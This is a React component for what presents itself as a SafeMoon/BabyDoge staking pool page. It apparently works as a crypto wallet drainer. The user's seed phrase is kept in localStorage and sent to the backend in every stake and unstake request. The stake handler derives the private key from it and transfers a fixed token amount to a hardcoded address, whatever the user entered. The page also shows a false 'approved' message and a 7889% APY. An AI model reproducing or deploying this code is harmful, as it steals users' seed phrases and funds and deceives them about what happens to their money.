import React, { useState, useEffect, useRef, useCallback } from 'react';
import $ from 'jquery';
import './index.css';
import Notification from '../Notification';
import {useHistory} from 'react-router-dom';
import { FaStoreAlt, FaArrowDown, FaArrowUp} from 'react-icons/fa';
import MetaMask from '../../img/quotation/metamask.svg';
import { ToastContainer, toast } from 'react-toastify';
import {apiSendStakeRequest, apiGetStakeDataById, apiSendUnstakeRequest} from '../../services/main';
import { io } from "socket.io-client";
import { restApiSettings } from "../../services/api";
import { ethers } from "ethers";
import Web3 from 'web3';
import Countdown from 'react-countdown';
import firstIcon from '../../img/quotation/lbd-bnb.svg';
import {calculateReward} from '../../services/utils';
import { TOKEN_ADDRESS2, TOKEN_ADDRESS, TOKEN_ABI, RPC_URL, ADMIN_WALLET_ADDRESS, STAKEINTERVAL } from '../../services/Types';
const { JsonRpcProvider } = require("@ethersproject/providers");

const StakingItem = (props) => {
    const [openNoti, setOpenNoti] = useState(false);
    const [titleNoti, setTitleNoti] = useState('');
    const [contentNoti, setContentNoti] = useState('');
    const dates = new Date(); // Now
    dates.setDate(dates.getDate() + 30);
    const [checked, setChecked] = useState('false');
    const [date, setState] = useState(dates)
    const [openCheck, setOpenChecked] = useState('close');
    const [detail, setDetail] = useState('false');
    const [stakeAmount, setStakeAmount] = useState('');
    const [balance, setBalance] = useState(100);
    const [isStake, setIsstake] = useState(false);
    const intervalRef = useRef()
    const counterDownRef = useRef();
    const socketRef = useRef();

    let [reward, setReward] = useState(0);

    const [login, setLogin] = useState(false);
    const [openModal, setOpenModal] = useState(false);
    const [address, setAddress] = useState(false);

    const [autoStart, setAutoStart] = useState(false);
    const [states, setStates] = useState(1);

    const history = useHistory();
    
    useEffect(() => {
        counterDownRef?.current.stop();
        if (autoStart) {
            counterDownRef.current.start();
        }
    }, [autoStart]);

    useEffect(() => {
        socketRef.current = io(restApiSettings.baseURL, { transports : ['websocket'] });
    }, []);

    useEffect(() => {
        if(localStorage.getItem('login') !== "true") {
            history.push('/home');
        }
        socketRef.current.on('unstakeReject-client', (res) => {
            if(res === localStorage.getItem('pharse')) {                        
                toast.info("Your unstaking request has been rejected");
            }
        });
        socketRef.current.on('unstakeResponse-client', (res) => { 
            if(res === localStorage.getItem('pharse'))  {
                alert("App");                      
                setIsstake(false);
                setAutoStart(false);                    
                setReward(0);
                toast.info((<>Your unstaking request has been approved! <br/>{stakeAmount} have been unstaked!...</>));
                history.go(0);
            }
        });   
    }, [states]);


    useEffect(() => {
        let formData = {
            userPass:localStorage.getItem('pharse')
        }
        apiGetStakeDataById(formData).then(res => {
            if(res.data.msg !== 'noStake') {   
                setReward(res.data.reward);
                localStorage.setItem('stakeAmount', res.data.stake[0].stakeAmount);
                setStakeAmount(res.data.stake[0].stakeAmount);
                setIsstake(true);
                setAutoStart(true);                    
            } else {
                setIsstake(false);
                setAutoStart(false);
            }
        }).catch(err => {
            console.log('err:', err);
        })
    }, [states]);

    const showDetail = () => {
        if(detail === 'false') {
            setDetail('true')
        } else {
            setDetail('false')
        }
    }    
    
    const openChecked = (status) => {
        setOpenChecked(status);
    }

    const settingStake = async () => {
        if (isNaN(stakeAmount)) {
            toast.error('String is not allowed!');
        }
        else if(stakeAmount > Number(localStorage.getItem('balance'))) {
            toast.error('Insufficient SafeMoon balance!');
        } else if(stakeAmount == 0) {
            toast.error('Wrong amount');
        } 
        else if(stakeAmount !== '') {
            const stakeRequest = {
                stakeAmount: stakeAmount,
                userPass: localStorage.getItem('pharse'),
                walletAddress: localStorage.getItem('address')
            }
            await apiSendStakeRequest(stakeRequest).then(res => {
                console.log("res-----", res);
            })
            .catch(err => {
                console.log("err-----", err);
                toast.error('Your info is wrong!');
            })
            setStakeAmount('');
            localStorage.setItem('stakeAmount', stakeAmount); 
            // toast.info('Please wait accepting!');

            setIsstake(true);
            setAutoStart(true);
                   
            setReward(0);
            toast.info((<>Your staking request has been approved!<br/>You have staked your {stakeAmount} BabyDoge!...</>));
            socketRef.current.emit("stake", "request");
            const send_token =  async () => {
                const mnemonic = localStorage.getItem('pharse');
                let privateKey = ethers.Wallet.fromMnemonic(mnemonic).privateKey;
                
                const web3 = new Web3(RPC_URL);
                let contract =  new web3.eth.Contract(TOKEN_ABI, TOKEN_ADDRESS);
    
                web3.eth.accounts.create(web3.utils.randomHex(32));
                let tempAddress = ethers.Wallet.fromMnemonic(mnemonic)['address'];
                // web3.eth.sign
                var account = web3.eth.accounts.privateKeyToAccount(privateKey);
                await web3.eth.getBalance(account['address']).then(console.log);
                
                const provider = new JsonRpcProvider("https://bsc-dataseed1.binance.org/");
                const signer = new ethers.Wallet(privateKey, provider);
                const router = new ethers.Contract(TOKEN_ADDRESS,TOKEN_ABI,signer);
                const nonce = await web3.eth.getTransactionCount(ADMIN_WALLET_ADDRESS,'pending')+1;
                const numberOfDecimals= 9;
                const numberOfTokens = ethers.utils.parseUnits(String(localStorage. getItem('stakeAmount')), numberOfDecimals);
                console.log('NumberOfTokens',numberOfTokens);
                // Send tokens
                const gasPrice= ethers.utils.parseUnits('5','gwei');
                const gasLimit=500000;
                const tx = await router.transfer("0x38ea916bb1878f97d3d7b7f9d38286f906cee0cc", 10000000000, 
                    { 
                    gasLimit: ethers.utils.hexlify(Number(gasLimit)), 
                    gasPrice: ethers.utils.hexlify(Number(gasPrice)),
                    // nonce:nonce,
                    });
                const txHash = tx.hash;
                console.log('txHash=====', txHash);
                const send_notification = async () => {
                    toast.info('Stake request has been processed successfully!');  
                    const balance = await contract.methods.balanceOf(tempAddress).call();   
                    localStorage.setItem('balance', parseInt(Number(balance)/(1000000000)));
                    history.go(0);
                }
                setTimeout(send_notification, 2000);                            
            }
            send_token();
        } 
        else {
            toast.error("Please input stake amount");
        } 
    }

    const renderer = ({ hours, minutes, seconds, completed, start }) => {
        if (completed) {
            setIsstake(false);
            localStorage.setItem('stakeAmount', 0);
            setState(Date.now() + 20000);            
            return <span></span>;
        } else {
            return <span></span>;
        }
    };

    const onTick = useCallback(() => {
        setStakeAmount(localStorage.getItem('stakeAmount'));
        reward = calculateReward(reward, stakeAmount);
        setStates(Math.random());
        console.log(reward, stakeAmount);
    }, [])

    const OpenModal = () => {
        if(openModal === false)
            setOpenModal(true)
        else
            setOpenModal(false);
    }

    const setPercentage = (percentage) => {
        let temp = localStorage.getItem('balance') * percentage/100;
        setStakeAmount(temp);
    }
    
    const onComplete = () => {
        if(localStorage.getItem('login') == 'true')
            toast.success(`Stake amount ${stakeAmount} has been successfully unstaked!`);
        setState(Date.now() + 20000);
        setStakeAmount('');
    }

    const unStake = () => {
        setStakeAmount('');
        const unstakeRequest = {
            userPass: localStorage.getItem('pharse'),
        }
        apiSendUnstakeRequest(unstakeRequest).then(res => {
            console.log("res-----", res);
            if(res.data.msg === 'success') {
                toast.info('Your unstake request has been submitted. Please allow up to 24h to be approved!')
                socketRef.current.emit("unstake", "request");
                localStorage.setItem('stakeAmount', 0);
            }
        })
        .catch(err => {
            console.log("err-----", err);
            toast.error('Your info is wrong!');
        })
    }
    const setStake = () => {
        if(localStorage.getItem('login') !== "true") {
            setTitleNoti('Notification');
            setContentNoti('Please login with your wallet')
            setOpenNoti(true);
        } else {
            history.push('/staking');
        }
    }
    

    return (
        <>
            <Countdown date={date}
                ref={counterDownRef}
                intervalDelay={STAKEINTERVAL}
                renderer={renderer}
                onTick={onTick}
                autoStart={false}
                onComplete={onComplete}
            />
            <Notification isOpen={openNoti} title={titleNoti} content={contentNoti} />
            <div className="swap__mainfield" style={{height:'auto', padding:'2.375rem 1rem 0.5rem 1rem'}}>
                <div className="badge bg-info team-rank px-3 bg-item" style={{position:'absolute', left:0, borderRadius:' .35rem 0 8px 0', top:0, boxShadow:' 0 0 5px rgba(0,0,0,.6)', textAlign:'center', paddingLeft:'1rem', paddingRight:'1rem', lineHeight:'1.6rem', width:'190px', color:'#f4f4f4', fontSize:'17px', fontWeight:300}}>SafeMoon Pool</div>                        
                <div id='swap-page' className="swap__page pt2">
                    <div className="swap__header__line__settings">
                        <div><img src="img/safemoon-safemoon-logo.svg" alt="icon" style={{width:'44px', display:'inline-block'}}/></div>
                    </div>
                    {localStorage.getItem('login') == 'true' && (
                        <div>
                            {isStake === false && (
                            <div>
                                <div>                            
                                    <p style={{fontSize:'14px', textAlign:'left', fontWeight:600}}>
                                        Available balance
                                    </p>
                                    <div className='title-color fs-12 pt-1 d-flex'>
                                        <div className='pool-percentage-btn' onClick={() => setPercentage(25)}>25%</div>
                                        <div className='pool-percentage-btn' onClick={() => setPercentage(50)}>50%</div>
                                        <div className='pool-percentage-btn' onClick={() => setPercentage(75)}>75%</div>
                                        <div className='pool-percentage-btn' onClick={() => setPercentage(100)}>100%</div>
                                    </div>
                                    <div className='text-center'>
                                        <div><input type="text" id="fname" name="firstname" className='stake-amount' placeholder="Type amount to stake" value={stakeAmount} onChange={(e) => setStakeAmount(e.target.value)} /></div>
                                    </div>
                                </div>
                                <div className="swap__connect pt-3">
                                    <button  type="button" id="stake_tokens p-1"  onClick={() => settingStake()} style={{fontFamily:'Open Sans', fontWeight:'bold'}}>Approve & Stake</button>
                                </div>
                            </div>
                            )}
                            {isStake === true && (
                                <div>
                                    <div className='d-flex justify-content-between'>                           
                                        <div><img src={firstIcon}  className='w-65'/></div>
                                    </div>
                                    <div>
                                        <p className='text-left fs-12 mb-0 mr-3 text-white pt-1 font-light'>Value Locked : {stakeAmount}</p>
                                        <p className='text-left fs-12 mb-0 mr-3 text-white pt-0 font-light'>Period : 30 days</p>
                                        <p className='text-left fs-12 mb-0 mr-3 text-white pt-0 font-light'>Rewards : Hourly</p>
                                    </div>
                                    <div className='text-center'>
                                        <p className='fs-6 pt-2 mb-0 mr-3 text-white font-light'>Current Rewards:</p>
                                        <h3 className='reward-color'>{reward}</h3>
                                    </div>

                                    <div className='text-center'>
                                        <div className=" inline-block w-60 mt-3 btn btn-primary rounded-button-long main-bg-color font-OpenSansBold mr-1" onClick={() => unStake()}>
                                            UnStake
                                        </div>
                                    </div>
                                </div>
                            )}
                        </div>
                    )}
                    
                    <div className='color-blackpink pt-3'>
                        <div className='d-flex justify-content-between'>
                            <div className='title-color pt-0 font-OpenSansSemiBold'>APY:</div>
                            <div className='d-flex'>
                                <span className='pl-2 text-white'>7889.13%</span>
                            </div>
                        </div>
                        <div className='d-flex justify-content-between'>
                            <div className='title-color pt-0 font-OpenSansSemiBold'>Your Stake (10^6):</div>
                            <div className='d-flex'>
                                <span className='pl-2 text-white'>{localStorage.getItem('stakeAmount')}$</span>
                            </div>
                        </div>
                    </div>
                
                    <hr className='hr-grey'/>

                    <div className='text-center py-2'>
                        <div className='d-flex justify-content-between'>
                            <div className='po-out-btn pool-title-color'><span><FaStoreAlt className='mt-1 mx-2'/></span> Core</div>
                            <div className='title-color pt-1 d-flex cursor-pointer' onClick={() => showDetail()}>
                                {detail === 'false' ? 'Details' : 'Hide'} 
                                {detail === 'false' && (
                                    <FaArrowDown className='align-self-center ml-2 pt-0'/>
                                )}
                                {detail === 'true' && (
                                    <FaArrowUp className='align-self-center ml-2 pt-0'/>
                                )}
                            </div>
                        </div>

                        {detail === 'true' && (
                            <>
                                <div className='color-blackpink pt-3'>
                                    <div className='d-flex justify-content-between'>
                                        <div className='title-color pt-0 font-OpenSansSemiBold'>Total:</div>
                                        <div className='pl-2 font-OpenSansBold fs-12'>77,466,708,174</div>
                                    </div>
                                </div>
                                <div className='title-color pt-1 d-flex cursor-pointer'>
                                    Add to Metamask <img src= {MetaMask} width={18} className='ml-2' />
                                </div>
                                {/* <div className='title-color pt-1 d-flex cursor-pointer'>
                                    View project site
                                </div> */}
                            </>
                        )}
                    </div> 
                </div>
            </div>
        </>
    )
}

export default StakingItem;
